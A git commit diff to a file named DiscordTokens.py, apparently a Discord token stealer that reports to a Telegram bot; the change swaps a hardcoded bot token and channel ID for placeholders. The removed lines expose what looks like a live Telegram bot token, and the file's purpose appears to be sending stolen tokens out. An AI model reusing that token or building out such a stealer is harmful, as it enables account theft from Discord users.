bcf6e2823581c8f8a8f74337a1fbdb8b72179b7c
Apkaless <106030623+Apkaless@users.noreply.github.com>
2024-04-12 20:45:41 +0300

    Update DiscordTokens.py

--- DiscordTokens.py
+++ DiscordTokens.py
@@ -6,8 +6,8 @@ import json
 import requests
 import subprocess
 
-BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
-CHANNEL_ID = -1002015035900
+BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN'
+CHANNEL_ID = 'CHANNEL ID WHERE THE BOT IS LOCATED'
 
 
 def send_download_link(download_link):
